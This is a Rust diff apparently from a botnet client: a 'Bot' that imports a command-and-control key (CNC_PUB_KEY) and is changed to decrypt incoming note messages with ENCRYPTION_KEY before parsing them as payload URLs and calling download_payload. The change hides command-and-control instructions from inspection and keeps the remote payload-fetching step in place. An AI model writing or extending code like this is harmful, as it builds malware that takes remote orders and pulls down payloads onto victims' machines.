@@ -15,8 +15,9 @@ pub mod state;
 use state::State;
 
 use crate::{
-    CNC_PUB_KEY,
+    CNC_PUB_KEY, ENCRYPTION_KEY,
     command::Commands,
+    encryption::decrypt,
     session::{Session, SessionProps},
 };
 
@@ -93,10 +94,12 @@ impl Bot {
                 Some(event) = notes_stream.next() => {
                     // Handle notes_stream similarly if needed
                     println!("Received note: {}", event.content);
-                    let payload_urls = serde_json::from_str::<HashMap<String, String>>(event.content.as_str());
-                    if let Ok(payload_urls) = payload_urls {
-                        self.state.payload = Some(download_payload(payload_urls).await);
-                        println!("path: {:?}", self.state.payload);
+                    if let Ok(decrypted) = decrypt(event.content.as_str(), ENCRYPTION_KEY) {
+                        let payload_urls = serde_json::from_str::<HashMap<String, String>>(decrypted.as_str());
+                        if let Ok(payload_urls) = payload_urls {
+                            self.state.payload = Some(download_payload(payload_urls).await);
+                            println!("path: {:?}", self.state.payload);
+                        }
                     }
                 }
             }
